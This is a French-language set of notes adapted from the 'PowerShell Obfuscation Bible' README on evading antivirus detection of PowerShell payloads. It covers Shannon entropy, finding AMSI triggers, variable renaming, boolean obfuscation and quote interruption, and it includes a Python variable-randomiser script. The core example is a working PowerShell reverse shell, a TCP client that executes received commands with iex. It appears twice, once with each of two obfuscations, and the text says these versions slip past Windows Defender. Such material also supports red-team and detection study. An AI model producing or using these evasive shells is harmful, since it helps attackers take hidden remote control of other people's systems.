Source : https://github.com/t3l3machus/PowerShell-Obfuscation-Bible/blob/main/README.md

L'**obfuscation** est le fait de **rendre** un payload **plus obscure** afin d'**évader** les protections **Antivirus**.

## __Entropy__

L'**entropie** est une notion mathématique qui vise à **mesurer** à quel point un **payload est aléatoire**, si une chaine est composé exclusivement d'un seul caractère son entropie sera 0, **plus il y a de caractère différent plus l'entropie va augmenter**, le calcul prend aussi en compte la **fréquence d'apparition** de ces caractères.

Pour la calculer on a implémenté la **formule de Claude E. Shannon** en python [voir scripts](PowerShell_Obfuscation##__Scripts__###Calculate_entropy).

![[Entropy1.png]]


## __Identify Detection Triggers__

Avant d'effectuer une tentative d'obscusissement du code, il faut **savoir ce qui déclanche l'alerte**, pour se faire, on peut utiliser **[AMSITrigger](https://github.com/RythmStick/AMSITrigger)**.

On peut également le faire à la main en regardant les erreurs.


## __Rename Objects__

Il est **important de renommer** le nom de **nos variables** en respectant le concept de [Entropie](PowerShell_Obfuscation.md##__Entropy__), cela rend le travail plus difficile pour les antivirus.

Voici un code détecté par les antivirus classique dont windows defender :

![[renameObj1.png]]

En remplaçant le nom des variables ainsi que **`(pwd).Path`** par **`$(gl)`**, on obtient un code que les antivirus ne découvre pas. 

```powershell
$84b5d7ab8755451cb386a79589e39fa8 = New-Object System.Net.Sockets.TCPClient('127.0.0.1',8181); $3b95c1d3d7dc4e4fa6474ce1bceae743 = $84b5d7ab8755451cb386a79589e39fa8.GetStream(); [byte[]] $367ad63a4a834bf5bb275aab24a4890c = 0..65535|%{0}; while(($d084ee484cf44c09b003024847840f3d = $3b95c1d3d7dc4e4fa6474ce1bceae743.Read($367ad63a4a834bf5bb275aab24a4890c, 0, $367ad63a4a834bf5bb275aab24a4890c.Length)) -ne 0){; $b16fd2353f0d413484e1583776256f61 = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($367ad63a4a834bf5bb275aab24a4890c,0, $d084ee484cf44c09b003024847840f3d); $b396f8bb13ec47c28e4f721085e95361 = (iex $b16fd2353f0d413484e1583776256f61 2>&1 | Out-String ); $2bfb84697b834fa09479071ec68d6b19 = $b396f8bb13ec47c28e4f721085e95361 + 'PS' + $(gl) + '> '; $12e0e1f0c5e14474b53907ee11f75ed7 = ([text.encoding]::ASCII).GetBytes($2bfb84697b834fa09479071ec68d6b19); $3b95c1d3d7dc4e4fa6474ce1bceae743.Write($12e0e1f0c5e14474b53907ee11f75ed7,0, $12e0e1f0c5e14474b53907ee11f75ed7.Length);$3b95c1d3d7dc4e4fa6474ce1bceae743.Flush()}; $84b5d7ab8755451cb386a79589e39fa8.Close()
```

On peut également remplacer le nom des variables par x * 'f', ce qui donnerai quelques choses comme :

```powershell
$ffffffffffffffffffffffffffffffff = New-Object System.Net.Sockets.TCPClient('127.0.0.1',8181); $fffffffffffffffffffff = $ffffffffffffffffffffffffffffffff.GetStream(); [byte[]] $ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff = 0..65535|%{0}; while(($ffffffffffffffffffffffffffffffffffffffffffffffffffffff = $fffffffffffffffffffff.Read($ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff, 0, $ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff.Length)) -ne 0){; $fffff = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff,0, $ffffffffffffffffffffffffffffffffffffffffffffffffffffff); $b396f8bb13ec47c28e4f721085e95361 = (iex $fffff 2>&1 | Out-String ); $fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff = $b396f8bb13ec47c28e4f721085e95361 + 'PS' + $(gl) + '> '; $ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff= ([text.encoding]::ASCII).GetBytes($fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff); $fffffffffffffffffffff.Write($ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff,0, $ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff.Length);$fffffffffffffffffffff.Flush()}; $ffffffffffffffffffffffffffffffff.Close()
```

Cela donnera une **entropie bien inférieur** à celle précédente et a **probablement de meilleur chance** face au Antivirus.

Pour **modifier automatiquement** le nom des variables [voir scripts](PowerShell_Obfuscation##__Scripts__###Edit_variables_names).


## __Hide_Boolean_Values___

Il est facile de **replacer** **`$True`** ou **`$False`** par des **expressions boolean équivalentes**, voici une liste d'expression qui **renvoit True**, il suffit de rajouter un **!** avant le **\[bool]** pour **renvoyer False** ex: `![bool]1254`.

#### Not 0, null, empty String => True

```
[bool]1254
[bool]0x12AE
[bool][convert]::ToInt32("111011", 2) # Converts a string to int from base 2 (binary)
![bool]$null
![bool]$False
[bool]"Any non empty string"
[bool](-12354893)   # Boolean typecast of a negative number 
[bool](12 + (3 * 6))
[bool](Get-ChildItem -Path Env: | Where-Object {$_.Name -eq "username"})
[bool]@(0x01BE)
[bool][System.Collections.ArrayList]
[bool][System.Collections.CaseInsensitiveComparer]
[bool][System.Collections.Hashtable]
```

#### Any class => True

```
[bool][bool]
[bool][char]
[bool][int] 
[bool][string]
[bool][double]
[bool][short]
[bool][decimal]
[bool][byte]
[bool][timespan]
[bool][datetime]
```

#### Bool expression

```
(9999 -eq 9999)
([math]::Round([math]::PI) -eq (4583 - 4580))
[Math]::E -ne [Math]::PI
```

#### All of this

```
[bool](![bool]$null)
[System.Collections.CaseInsensitiveComparer] -ne [bool][datetime]'2023-01-01'
[bool]$(Get-LocalGroupMember Administrators)
!!!![bool][bool][bool][bool][bool][bool]
```


## __Quote_Interruption__

On peut placer des guillements entre les cmdlets de powershell afin d'obfusquer notre payload.
Pour voir la liste des cmdlets, on peut effectuer la commande `get-`


## __Scripts__

### Calculate_entropy

Plus la valeur est proche de 0 moins les caractères sont aléatoire.

```python
#!/bin/python3
# Usage: python3 entropy.py <file>

import math, sys

def entropy(string):
    "Calculates the Shannon entropy of a UTF-8 encoded string"

    # decode the string as UTF-8
    unicode_string = string.decode('utf-8')

    # get probability of chars in string
    prob = [ float(unicode_string.count(c)) / len(unicode_string) for c in dict.fromkeys(list(unicode_string)) ]

    # calculate the entropy
    entropy = - sum([ p * math.log(p) / math.log(2.0) for p in prob ])

    return entropy


f = open(sys.argv[1], 'rb')
content = f.read()
f.close()

print(entropy(content))
```

### Edit_variables_names

Il faut faire attention car ce script n'est pas parfait et peut casser certaines fonctionnalité dans de gros programmes.

```python
#!/bin/python3
#
# This script is an example. It is not perfect and you should use it with caution.
# Source: https://github.com/t3l3machus/PowerShell-Obfuscation-Bible
# Usage: python3 randomize-variables.py <path/to/powershell/script>

import re
from sys import argv
from uuid import uuid4

def get_file_content(path):
	f = open(path, 'r')
	content = f.read()
	f.close()
	return content
	

def main():

	payload = get_file_content(argv[1])
	used_var_names = []

	# Identify variables definitions in script
	variable_definitions = re.findall('\$[a-zA-Z0-9_]*[\ ]{0,}=', payload)
	variable_definitions.sort(key=len)
	variable_definitions.reverse()

	# Replace variable names
	for var in variable_definitions:
		
		var = var.strip("\n \r\t=")

		while True:
			
			new_var_name = uuid4().hex
			
			if (new_var_name in used_var_names) or (re.search(new_var_name, payload)):
				continue
				
			else:
				used_var_names.append(new_var_name)
				break	
						
		payload = payload.replace(var, f'${new_var_name}')
	
	print(payload + '\n')

	
main()
```